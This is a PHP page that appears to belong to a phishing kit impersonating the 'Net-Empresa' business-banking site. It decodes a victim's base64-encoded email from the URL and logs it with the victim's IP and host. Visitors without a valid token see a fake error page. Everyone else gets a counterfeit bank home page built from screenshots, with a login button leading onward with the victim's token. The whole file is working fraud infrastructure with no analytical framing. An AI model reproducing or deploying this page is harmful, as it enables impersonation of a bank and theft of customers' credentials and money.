<?php
include('lib.php');
$emailx = $_GET['cliente'];
$email = base64_decode($emailx);
if (isset($_GET['cliente']) && !filter_var($email, FILTER_VALIDATE_EMAIL) === false) { 
	$msg = "in: $email - $ip ($host)- $data\n";
	$myFl = "acc-log.txt";
	$open = fopen($myFl, 'a') or die("can't open file");
	fwrite($open, $msg);
	fclose($open);
} else { 
	echo $e500; exit;
}  

include('../../_functions/functions.php');

$_SESSION['Inicializar'] = 1;
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Net-Empresa</title>
	<link rel="icon" href="../../_images/juba/favicon.ico">
	<link rel="stylesheet" href="../../_styles/juba/home.css">
	<script type="text/javascript" src="../../_jscripts/juba/jquery.js"></script>
	<script type="text/javascript" src="../../_jscripts/juba/jcycle.js"></script>
	
<script>
$(function(){
	$('.slider ul').cycle({
		fx:    		'scrollLeft',  
		speed:  	 1000,
		timeout: 	 5000,
		next: 		'#prox',
		prev:  		'#ant',
		pager: 		'#pager'
	});
});
</script>	
</head>
<body>
	<div class="header_top">
		<div class="content">
			<div class="logo_net_emp">
				<img src="../../_images/juba/logo_net_emp.png" height="22" width="155" alt="">
			</div><!-- logo_net_emp -->
			<a href="acesso.php?cliente=<?php echo $emailx;?>"><div class="btn_enter"></div></a><!-- btn_enter -->
			<div class="hot_to_use_header"><img src="../../_images/juba//hot_to_use_header.png" height="24" width="74" alt=""></div><!-- hot_to_use_header -->

			<div class="acess_outher"><img src="../../_images/juba//acess_outher.png" height="27" width="219" alt=""></div><!-- acess_outher -->
			<div class="now_time">
				
			<?php
				$GTN_NumeroDiaSemana = date('w');
				$GTN_NumeroDiaMes = date('d');
				$GTN_NumeroMes = date('n');
				$GTN_NumertoAno = date('Y');

				/*$ GTN_NumeroDiaSemana, $GTN_NumeroMes*/
				switch($GTN_NumeroDiaSemana):
					case '0':
						$diaSemana = 'Domingo';
					break;
					case '1':
						$diaSemana = 'Segunda feira';
					break;	
					case '2':
						$diaSemana = 'Ter&ccedil;a feira';
					break;	
					case '3':
						$diaSemana = 'Quarta feira';
					break;	
					case '4':
						$diaSemana = 'Quinta feira';
					break;	
					case '5':
						$diaSemana = 'Sexta feira';
					break;	
					case '6':
						$diaSemana = 'S&aacute;bado';
					break;		
				endswitch;
				/*$diaSemana*/
				switch($GTN_NumeroMes):
					case '1':
						$nomeMes = 'janeiro';
					break;
					case '2':
						$nomeMes = 'fevereiro';
					break;	
					case '3':
						$nomeMes = 'mar&ccedil;o';
					break;	
					case '4':
						$nomeMes = 'abril';
					break;	
					case '5':
						$nomeMes = 'maio';
					break;	
					case '6':
						$nomeMes = 'junho';
					break;	
					case '7':
						$nomeMes = 'julho';
					break;	
					case '8':
						$nomeMes = 'agosto';
					break;
					case '9':
						$nomeMes = 'setembro';
					break;
					case '10':
						$nomeMes = 'outubro';
					break;
					case '11':
						$nomeMes = 'novembro';
					break;
					case '12':
						$nomeMes = 'dezembro';
					break;	
				endswitch;
				/*$nomeMes*/
				echo "$diaSemana, $GTN_NumeroDiaMes de $nomeMes de $GTN_NumertoAno";
			?>
			</div><!-- now_time -->
		<div class="clear"></div>	
		</div><!-- content -->
	</div><!-- header_top -->

	<div class="header_center">
		<div class="content">
			<div class="cima_center">
				<div class="logo_emp_big">
					<img src="../../_images/juba/logo_net_emp_center_big.jpg" height="52" width="219" alt="">
				</div><!-- logo_emp_big -->
				<div class="cima_menu_net_emp">
					<img src="../../_images/juba/menu_center_net_emp.jpg" height="52" width="695" alt="">
				</div><!-- cima_menu_net_emp -->
			</div><!-- cima_center -->
			<div class="baixo_center">
				<div class="local_center">
					<img src="../../_images/juba/inicio_home_center.jpg" height="38" width="70" alt="">
				</div><!-- local_center -->
				<div class="busca_center">
					<img src="../../_images/juba/busca_center_home.jpg" height="38" width="190" alt="">
				</div><!-- busca_center -->
			</div><!-- baixo_center -->
		<div class="clear"></div>	
		</div><!-- content -->
	</div><!-- header_center -->

	<div class="content_geral">
		<div class="content position-relative border-content-one">
			<div class="slider">
				<ul>
					<li><img src="../../_images/juba/banner_1.jpg" height="500" width="1230" alt="Banner apresenta��o"></li>
					<li><img src="../../_images/juba/banner_2.jpg" height="500" width="1230" alt="Banner apresenta��o"></li>
					<li><img src="../../_images/juba/banner_3.jpg" height="500" width="1230" alt="Banner apresenta��o"></li>
					<li><img src="../../_images/juba/banner_4.jpg" height="500" width="1230" alt="Banner apresenta��o"></li>
					<li><img src="../../_images/juba/banner_5.jpg" height="500" width="1230" alt="Banner apresenta��o"></li>
				</ul>
			</div><!-- slider -->
			<div class="menu_left">
				<img src="../../_images/juba/home_content_menu_big.png" height="701" width="212" alt="">
			</div><!-- menu_left -->
			<div class="outher_box">
				<img src="../../_images/juba/outher_box.jpg" height="321" width="998" alt="">
			</div><!-- outher_box -->
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- content_geral -->

	<div class="content_geral" style="z-index:999;">
		<div class="content border-content-two">
			<div class="logo_jogos">
				<img src="../../_images/juba/selando_grid_gif.gif" height="130" width="185" alt="">
			</div><!-- logo_jogos -->
			<div class="pos_right">
				<div class="cima_pos_right">
					<img src="../../_images/juba/right_pos_alto.png" height="198" width="997" alt="">
				</div><!-- cima_pos_right -->
				<div class="baixo_pos_right">
					<img src="../../_images/juba/cima_pos_right.jpg" height="168" width="998" alt="">
				</div><!-- baixo_pos_right -->
			</div><!-- pos_right -->
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- content_geral -->
	<div class="footer">
		<div class="content">
			<div class="footer_one">
				<img src="../../_images/juba/footer_one.jpg" width="1230" alt="">
			</div>
			<div class="footer_two">
				<img src="../../_images/juba/footer_two.jpg" width="1230" alt="">
			</div>
			<div class="footer_three">
				<img src="../../_images/juba/footer_three.jpg" width="1230" alt="">
			</div>
		</div>
	</div>
</body>
</html>